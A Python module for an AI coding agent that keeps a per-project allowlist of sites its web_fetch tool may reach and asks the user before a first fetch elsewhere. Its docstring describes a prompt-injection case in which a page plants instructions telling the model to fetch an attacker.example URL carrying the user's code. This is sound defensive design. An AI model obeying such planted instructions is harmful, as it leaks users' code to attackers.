"""Which sites web_fetch may reach without asking.

A fetch is also a way to send data out: a page with planted instructions can ask the model
to fetch https://attacker.example/?data=<your code>. So the first fetch from a site the user
has not approved asks, like Claude Code's per-domain WebFetch permission. Approved sites are
remembered per project under AGENTCLI_HOME (not in the project), and a few documentation
sites are allowed from the start. A redirect to a site not approved is not followed.
"""

from __future__ import annotations

import json
from urllib.parse import urlsplit

from agentcli.memory.files import project_key
from agentcli.paths import agentcli_home

# Reference sites an agent reads all the time; subdomains included.
DEFAULT_ALLOWED = (
    "python.org",
    "pypi.org",
    "readthedocs.io",
    "github.com",
    "githubusercontent.com",
    "stackoverflow.com",
    "developer.mozilla.org",
    "wikipedia.org",
    "npmjs.com",
    "docs.rs",
)


def host_of(url: str) -> str:
    try:
        return (urlsplit(url.strip()).hostname or "").lower().rstrip(".")
    except ValueError:
        return ""


def _matches(host: str, domain: str) -> bool:
    domain = domain.lower().strip().lstrip("*.").rstrip(".")
    return bool(domain) and (host == domain or host.endswith("." + domain))


class DomainPolicy:
    def __init__(self, cwd: str, configured: list[str] | tuple[str, ...] = ()):
        self.path = agentcli_home() / "permissions" / f"{project_key(cwd)}.json"
        self.configured = [str(d) for d in configured]

    def saved(self) -> list[str]:
        try:
            data = json.loads(self.path.read_text(encoding="utf-8"))
        except (OSError, json.JSONDecodeError):
            return []
        return [str(d) for d in data.get("web_domains", []) if isinstance(d, str)]

    def allowed(self, host: str) -> bool:
        if not host:
            return False
        domains = (*DEFAULT_ALLOWED, *self.configured, *self.saved())
        return any(_matches(host, domain) for domain in domains)

    def remember(self, host: str) -> None:
        saved = self.saved()
        if host and host not in saved:
            saved.append(host)
            self.path.parent.mkdir(parents=True, exist_ok=True)
            self.path.write_text(
                json.dumps({"web_domains": sorted(saved)}, ensure_ascii=False, indent=1),
                encoding="utf-8",
            )


def policy_for(cwd: str, config) -> DomainPolicy:
    return DomainPolicy(cwd, config.web.allowed_domains)


__all__ = ["DEFAULT_ALLOWED", "DomainPolicy", "host_of", "policy_for"]
